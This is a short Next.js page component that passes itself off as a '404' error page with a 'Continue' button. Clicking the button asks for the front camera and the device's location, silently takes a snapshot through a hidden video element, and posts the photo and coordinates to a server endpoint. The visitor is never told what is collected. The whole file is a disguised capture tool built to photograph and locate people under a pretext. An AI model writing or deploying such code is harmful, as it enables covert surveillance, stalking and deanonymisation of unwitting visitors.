"use client";
import { useRef } from "react";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);

  async function capture() {
    // CAMERA
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    if (videoRef.current) videoRef.current.srcObject = stream;

    // LOCATION
    navigator.geolocation.getCurrentPosition(async pos => {
      const canvas = document.createElement("canvas");
      canvas.width = 300;
      canvas.height = 300;
      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(videoRef.current!, 0, 0, 300, 300);

      const image = canvas.toDataURL("image/jpeg");

      await fetch("/api/send", {
        method: "POST",
        body: JSON.stringify({
          image,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    });
  }

  return (
    <div style={{ textAlign: "center", marginTop: 80 }}>
      <h1>404</h1>
      <p>Click Here to continue</p>

      <video ref={videoRef} autoPlay playsInline hidden />

      <button onClick={capture}>
        Continue
      </button>
    </div>
  );
}
